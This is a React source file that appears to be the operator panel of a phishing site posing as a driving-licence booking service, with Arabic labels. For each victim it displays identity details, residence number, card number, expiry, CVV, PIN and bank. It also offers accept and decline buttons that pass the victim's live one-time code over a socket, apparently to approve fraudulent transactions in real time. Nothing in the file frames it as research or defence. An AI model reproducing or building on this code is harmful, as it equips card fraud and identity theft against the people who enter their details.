import axios from 'axios'
import React, { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import { serverRoute, token } from './App'
import { FaArrowRight } from 'react-icons/fa6'

const Order = ({data,socket,setActive,reftch}) => {
    const [order,setOrder] = useState({})

    const getOrder = async ()=>{
      try {
        const order = await axios.get(serverRoute+`/order/${data.id}`,{headers:{'Authorization':`Bearer ${token}`}})
        setOrder(order.data.order)
      } catch (error) {
        if(error.response.status === 401){
          window.location.href='/login'
          localStorage.removeItem('token')
        }else if (error.response.status === 404){
            window.alert('Order Not Found')
        }
      }
  
    }
    useEffect(()=>{
      (async()=>{
        getOrder()
 
      })()
    },[])

    const acceptOtp = async ()=>{
      socket.emit('acceptOtp',{id:data.id,token:order.token,otp:data.otp})
      setActive({nav:'',data:{}})
    }
    const declineOtp = async ()=>{
      socket.emit('declineOtp',{id:data.id,token:order.token})
      setActive({nav:'',data:{}})
    }
    return (
      <>
      {
        data.otp ?      
        <div className='w-full'>
        <div className='grid grid-cols-1  gap-x-1   w-full justify-center bg-white items-center p-3 my-2  rounded-md rounded-r-none gap-y-2 ' >
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>مستخدم</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.username}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>الاسم رباعي</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.fullname}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>رمز التحقق</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{data.otp}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>رقم الكارت</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center text-xs justify-center flex-1'>{order.card_number}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>تاريخ الانتهاء</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.expire_date}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>CVV</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.cvv}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>PIN</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.pin}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>بنك</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.bank}</span>
            </div>
            <div  className='flex  items-center justify-around w-full rounded-md py-1 gap-x-1' dir='rtl' >
              <button className='text-white bg-green-500 flex-1 py-2' onClick={acceptOtp}>قبول</button>
              <button className='text-white bg-red-500 flex-1 py-2' onClick={declineOtp}>رفض</button>
            </div>
        </div>
  </div> : data.auth ?<div></div> :
          <div className='w-full'>
              <div className='grid grid-cols-1   w-full justify-start bg-white items-center p-3 my-2  rounded-md rounded-r-none gap-y-2 ' > 
            <div><FaArrowRight className='cursor-pointer bg-green-500 h-10 p-2 text-white rounded-full w-10' onClick={()=>setActive({nav:'',data:{}})}/></div>
              <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>مستخدم</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.username}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>الاسم رباعي</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.fullname}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>ايميل</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.email}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>هاتف</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.phone}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>تاريخ الميلاد</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.birth}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>لغته</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center text-xs justify-center flex-1'>{order.lang}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>الجنسيه</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.nationalty}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>رقم الاقامه</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.nation_number}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>نوع القير</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.car_type}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'> نوع الرخصه</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.licence_type}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>الخدمه</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center text-xs justify-center flex-1'>{order.service}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'> الميعاد</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.time}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>لغه التدريب</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.nation_number}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>نوع الخدمه</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.nationalty}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>رمز التحقق</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.otp || '-'}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>رقم الكارت</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center text-xs justify-center flex-1'>{order.card_number}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>تاريخ الانتهاء</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.expire_date}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>CVV</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.cvv}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>PIN</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.pin}</span>
            </div>
            <div className='flex  items-center justify-around w-full rounded-md py-1 ' dir='rtl' style={{border:'1px solid #eee'}}>
              <span className='flex items-center justify-center flex-1'>بنك</span>
              <span style={{borderRight:'1px solid #eee'}} className='flex items-center justify-center flex-1'>{order.bank}</span>
            </div>
              </div>
          </div>
      }

      </>
    )
}

export default Order
